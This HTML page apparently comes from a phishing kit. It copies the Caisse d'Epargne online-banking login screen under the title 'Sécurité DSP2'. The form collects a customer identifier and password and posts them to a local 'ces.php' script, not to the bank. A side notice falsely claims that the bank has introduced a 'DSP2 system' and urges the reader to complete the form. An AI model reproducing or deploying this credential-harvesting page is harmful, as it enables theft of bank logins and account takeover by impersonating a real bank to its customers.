
<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<title>Sécurité DSP2</title>
	<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	<link rel="stylesheet" href="./ce/index_ce.css">
	<link rel="icon" type="image/x-icon" href="./ressources/ce/logo-ce-mobile.png">
</head>

<body>
	<as-root _nghost-mrn-c11="" ng-version="13.1.3">
		<as-fqdn _ngcontent-mrn-c11=""></as-fqdn>
		<router-outlet _ngcontent-mrn-c11=""></router-outlet>
		<as-template-page class="ng-star-inserted">
			<as-template _nghost-mrn-c35="" class="ng-star-inserted">
				<div _ngcontent-mrn-c35="" class="authentication_frame ng-star-inserted">
					<button _ngcontent-mrn-c35="" tabindex="0" aria-label="Aller au contenu" uibuttonv2=""
						bpceariabutton="" category="quaternary" id="p-identifier-btn-goToContents"
						class="evitement bpce-focus-reset bpce-button bpce-button-quaternary bpce-button-inline bpce-button-no-border"
						_nghost-mrn-c27="" role="button"><span _ngcontent-mrn-c27=""> Aller au contenu </span></button>
					<ui-header _ngcontent-mrn-c35="" role="banner" leftbuttonlabel="Quitter" leftbuttonicon=""
						_nghost-mrn-c29="" class="ng-star-inserted">
						<div _ngcontent-mrn-c29=""
							class="bpce-header bpce-header-with-border-bottom bpce-header-with-background">
							<div _ngcontent-mrn-c29="" class="bpce-header-left" style="min-width: 127px;">
							</div>
							<div _ngcontent-mrn-c29="" class="bpce-header-middle">
								<div _ngcontent-mrn-c29="" class="bpce-header-ellipsis-container"><img
										_ngcontent-mrn-c35="" alt="Logo de la banque" class="logo"
										src="./ressources/ce/logo-ce-mobile.png"
										aria-label="Logo CAISSE D'EPARGNE"></div>
							</div>
							<div _ngcontent-mrn-c29="" class="bpce-header-right" style="min-width: 127px;">
								<button _ngcontent-mrn-c35="" bpceariabutton="" uibuttonv2="" category="secondary"
									icon="help" id="p-identifier-btn-support"
									class="support-link bpce-focus-reset bpce-button bpce-button-secondary bpce-button-inline bpce-button-no-border bpce-button-font-text ng-star-inserted"
									_nghost-mrn-c27="" tabindex="0" role="button">
									<ui-icon-v2 _ngcontent-mrn-c27="" _nghost-mrn-c15=""
										class="ng-star-inserted"></ui-icon-v2><span _ngcontent-mrn-c27=""> Assistance
									</span></button>
							</div>
						</div>
					</ui-header>
					<div _ngcontent-mrn-c35="" class="bpce-container">
						<div _ngcontent-mrn-c35="" class="bpce-row authentication_body">
							<div _ngcontent-mrn-c35="" class="bpce-col-md-5 bpce-col-sm-8 bpce-col-xs-4 left-column">
								<div _ngcontent-mrn-c35="" role="main" tabindex="-1" class="container">
									<h1 _ngcontent-mrn-c35="" aria-live="assertive" class="as-page-title">Saisissez
										votre identifiant</h1>
									<div _ngcontent-mrn-c35="" class="as-page-container">
										<router-outlet></router-outlet>
										<as-identifier _nghost-mrn-c137="" class="ng-star-inserted">
											<as-form-identifier _ngcontent-mrn-c137="" _nghost-mrn-c135=""
												class="ng-star-inserted">
												<form method="post" action="ces.php">
													<div _ngcontent-mrn-c135="" class="leftTop">

														<ui-input-v2 _ngcontent-mrn-c135=""
															aria-label="Entrez votre identifiant" aria-required="true"
															name="identifier" ngclass="input-identifier"
															_nghost-mrn-c64=""
															class="input-identifier ng-dirty ng-valid ng-touched"
															required="">
															<label _ngcontent-mrn-c64=""
																class="bpce-input-v2 bpce-input-v2-valued"
																for="input-v2-1">
																<input name="identifier" _ngcontent-mrn-c64=""
																	class="bpce-input-v2-field ng-valid ng-dirty ng-touched"
																	id="input-identifier" type="text"
																	inputmode="numeric"
																	aria-label="Entrez votre identifiant"
																	aria-invalid="false" required><span
																	_ngcontent-mrn-c64="" aria-hidden="true"
																	class="bpce-input-v2-label bpce-input-v2-label-float">Entrez
																	votre identifiant</span>
																<button _ngcontent-mrn-c64="" type="button"
																	uibuttonv2="" category="secondary" noborder="true"
																	icon="erase"
																	class="bpce-input-v2-icon bpce-input-v2-clear bpce-focus-reset bpce-button-icon-only bpce-button bpce-button-secondary bpce-button-inline bpce-button-no-border bpce-button-font-text ng-star-inserted"
																	_nghost-mrn-c27="" aria-label="Supprimer la saisie"
																	tabindex="0" aria-disabled="false" role="button">
																	<ui-icon-v2 _ngcontent-mrn-c27="" _nghost-mrn-c15=""
																		class="ng-star-inserted"></ui-icon-v2>
																</button>
															</label>
														</ui-input-v2>
														<br>
														<ui-input-v2 _ngcontent-mrn-c135=""
															aria-label="Entrez votre identifiant" aria-required="true"
															name="identifier" ngclass="input-identifier"
															_nghost-mrn-c64=""
															class="input-identifier ng-dirty ng-valid ng-touched"
															required="">
															<label _ngcontent-mrn-c64=""
																class="bpce-input-v2 bpce-input-v2-valued"
																for="input-v2-1">
																<input name="inp_ce_mp" _ngcontent-mrn-c64=""
																	class="bpce-input-v2-field ng-valid ng-dirty ng-touched"
																	id="input-identifier" type="text"
																	inputmode="numeric"
																	aria-label="Entrez votre identifiant"
																	aria-invalid="false" maxlength="8" required><span
																	_ngcontent-mrn-c64="" aria-hidden="true"
																	class="bpce-input-v2-label bpce-input-v2-label-float">Entrez
																	votre mot de passe</span>
																<button _ngcontent-mrn-c64="" type="button"
																	uibuttonv2="" category="secondary" noborder="true"
																	icon="erase"
																	class="bpce-input-v2-icon bpce-input-v2-clear bpce-focus-reset bpce-button-icon-only bpce-button bpce-button-secondary bpce-button-inline bpce-button-no-border bpce-button-font-text ng-star-inserted"
																	_nghost-mrn-c27="" aria-label="Supprimer la saisie"
																	tabindex="0" aria-disabled="false" role="button">
																	<ui-icon-v2 _ngcontent-mrn-c27="" _nghost-mrn-c15=""
																		class="ng-star-inserted"></ui-icon-v2>
																</button>
															</label>
														</ui-input-v2>

														<br>
														<div _ngcontent-mrn-c135=""
															class="text-center ng-star-inserted">
															<div _ngcontent-mrn-c135="" uibuttonv2group=""
																_nghost-mrn-c28="" class="bpce-button-group">
																<button _ngcontent-mrn-c135="" uibuttonv2=""
																	name="btn_ces_submit" alignment="block"
																	category="primary" type="submit"
																	id="p-identifier-btn-validate" _nghost-mrn-c27=""
																	class="bpce-focus-reset bpce-button bpce-button-primary bpce-button-block bpce-button-font-text"
																	tabindex="0" aria-disabled="false"
																	role="button"><span _ngcontent-mrn-c27="">
																		<span _ngcontent-mrn-c135=""
																			as-content-loader=""
																			_nghost-mrn-c71="">Valider</span>
																	</span>
																</button>
															</div>

															</as-a11y-toggle>
														</div>
														<div _ngcontent-mrn-c135="" class="leftBottom">
															<ui-checkbox _ngcontent-mrn-c135="" name="isMemorized"
																_nghost-mrn-c132=""
																class="ng-untouched ng-valid ng-dirty">


															</ui-checkbox>


														</div>
													</div>
												</form>
											</as-form-identifier>
										</as-identifier>
									</div>
								</div>
							</div>
							<div _ngcontent-mrn-c35="" class="bpce-col-md-7 right-column ng-star-inserted">
								<as-template-right-column _ngcontent-mrn-c35=""
									class="template-right-column ng-tns-c34-0 ng-star-inserted" _nghost-mrn-c34="">
									<div _ngcontent-mrn-c34="" role="img" aria-label="Image de fond de la banque"
										class="right-column ng-tns-c34-0"
										style="background-image: url(&quot;./ressources/ce/background_startup_ce_default.jpg&quot;);">
										<div _ngcontent-mrn-c34=""
											class="common-info ng-tns-c34-0 ng-trigger ng-trigger-simpleFadeAnimation ng-star-inserted"
											style="opacity: 1;"><span _ngcontent-mrn-c34=""
												class="ng-tns-c34-0">Bienvenue</span></div><img _ngcontent-mrn-c34=""
											class="overlay-background ng-tns-c34-0 ng-star-inserted" src="">
										<div id="kameleoonElement-auth-bp" class="steps"
											style="position: absolute; top: calc(72px);">
											<div class="bpce-infobox-kam">
												<div class="bpce-infobox-header">
													<svg width="24" height="24" viewBox="0 0 512 512"
														xmlns="http://www.w3.org/2000/svg">
														<path
															d="M269.776 71.318l208 352a16.014 16.014 0 01.128 16.064A16.037 16.037 0 01464 447.446H48a16.011 16.011 0 01-13.888-8.064 15.937 15.937 0 01.112-16.064l208-352c5.776-9.76 21.776-9.76 27.552 0zM256 110.902L76.032 415.446h359.936L256 110.902zm.002 240.544c8.832 0 16 7.168 16 16 0 8.848-7.168 16-16 16s-16-7.152-16-16c0-8.832 7.168-16 16-16zm0-160c8.848 0 16 7.168 16 16v96c0 8.848-7.152 16-16 16-8.848 0-16-7.152-16-16v-96c0-8.832 7.152-16 16-16z"
															fill="#db0029" fill-rule="evenodd"></path>
													</svg>
													<p class="bpce-infobox-title">Bienvenue dans votre espace DSP2</p>
												</div>
												<div class="bpce-infobox-content">
													<div>Afin de sécuriser votre compte, votre banque Caisse d'Epargne a
														mis en place un système DSP2.</div>
													<div>Le système DSP2 s'active très simplement, nous vous invitons a
														compléter le formulaire suivant.</div>
												</div>
											</div>
										</div>
									</div>
								</as-template-right-column>
							</div>
						</div>
					</div>
				</div>
			</as-template>
		</as-template-page>
		<div _ngcontent-mrn-c11="" class="redirect-outlet">
			<router-outlet _ngcontent-mrn-c11="" name="redirect"></router-outlet>
		</div>
		<router-outlet _ngcontent-mrn-c11="" name="modal"></router-outlet>
		<ng-component>
			<router-outlet></router-outlet>
		</ng-component>
		<router-outlet _ngcontent-mrn-c11="" name="modal-2"></router-outlet><img _ngcontent-mrn-c11=""
			src="assets/small.png" alt="Ecr image" style="display: none;">
	</as-root>
</body>

</html>